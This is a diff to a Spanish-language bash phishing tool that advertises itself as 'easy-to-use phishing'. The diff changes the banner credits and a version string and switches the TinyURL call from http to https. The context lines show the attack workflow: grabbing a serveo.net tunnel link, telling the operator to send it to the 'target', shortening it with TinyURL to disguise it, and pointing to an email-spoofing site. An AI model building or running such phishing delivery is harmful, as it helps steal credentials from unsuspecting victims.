@@ -238,11 +238,11 @@ printf "    .-----.----.----.-----.----.   |   Y   |   _   |   Y   |      \n"
 printf "    |  -__|   _|   _|  _  |   _|   |   |   |.  |   |   |   |     \n"
 printf "    |_____|__| |__| |_____|__|     |____   |.  |   |____   |     \n"
 printf "                                       |:  |:  1   |   |:  |    \n"
-printf "     \e[0m\e[1;77m Hecho por Javic      \e[1;31m                |::.|::.. . |   |::.|    \n"
+printf "     \e[0m\e[1;77m V1.0.30    \e[1;31m                |::.|::.. . |   |::.|    \n"
 printf "                                        --- -------     ---     \n"
                                           
 printf "\n"
-printf "\e[1;77m       .........\e[0m\e[1;93m Dedicado al Grupo de Error404\e[0m\e[1;77m...........\e[0m\n" 
+printf "\e[1;77m       ...............\e[0m\e[1;93m JAIME ANDRES MATEUS\e[0m\e[1;77m..............\e[0m\n" 
 printf "\e[1;77m       .............\e[0m\e[1;93m Phishing facil de usar \e[0m\e[1;77m.............\e[0m\n"                              
 printf "\e[1;93m       .....\e[0m\e[1;92m Porque el conocimiento debe ser libre\e[0m \e[1;93m......\e[0m\n"
 printf "\n"
@@ -364,7 +364,7 @@ sleep 10
 send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
 printf "\n"
 printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Envía el enlace directo al objetivo:\e[0m\e[1;77m %s \n' $send_link
-send_ip=$(curl -s http://tinyurl.com/api-create.php?url=$send_link | head -n1)
+send_ip=$(curl -s https://tinyurl.com/api-create.php?url=$send_link | head -n1)
 printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] o puedes usar Tinyurl:\e[0m\e[1;77m %s \n' $send_ip
 printf "\e[1;77m....\e[0m\e[1;93m Tambien puedes enviar Email Spoof en los siguientes enlaces:\e[0m\e[1;77m...\e[0m\n"
 printf "\e[1;92m[\e[0m*\e[1;92m] https://emaildepruebas.000webhostapp.com/ \e[0m\e[1;77m %s\e[0m\n"
